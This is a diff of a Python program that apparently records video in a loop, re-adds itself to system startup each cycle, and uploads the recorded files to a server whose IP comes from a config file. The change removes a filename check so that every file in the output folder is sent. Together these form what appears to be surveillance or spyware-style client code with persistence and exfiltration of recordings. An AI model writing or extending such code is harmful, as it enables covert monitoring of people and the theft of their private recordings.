@@ -164,12 +164,12 @@ def into_server(create_time_dt):
         print(formatted_str)
         _file_found = file.split(' ')
         print(_file_found[1])
-        if _file_found[1].split('.')[0] == formatted_str :
-            print('record success...')
-            imgfp = open(directory+file, 'rb')
-            imgdata = imgfp.read()
-            imgfp.close()
-            send(imgdata, find_time(), find_time(), file, user_name)
+        # if _file_found[1].split('.')[0] == formatted_str :
+        print('record success...')
+        imgfp = open(directory+file, 'rb')
+        imgdata = imgfp.read()
+        imgfp.close()
+        send(imgdata, find_time(), find_time(), file, user_name)
 def create_result_directory():
     global directory
     directory = "C:\\Users/Public/Result_Output/"
@@ -181,13 +181,12 @@ def create_result_directory():
 def start_monitoring():
     while True:
         add_to_startup()
-        # add_login_startup("C:\\path\\to\\your\\program.exe")
         create_result_directory()
         print('++++++++++++++++++++++')
         video_record()
 status = True
 while status:
-    with open('setting.txt', 'r') as file:
+    with open('setting.conf', 'r') as file:
         for line in file:
             if line.startswith('SERVER_IP'):
                 server_ip = line.split('=')[1].strip()
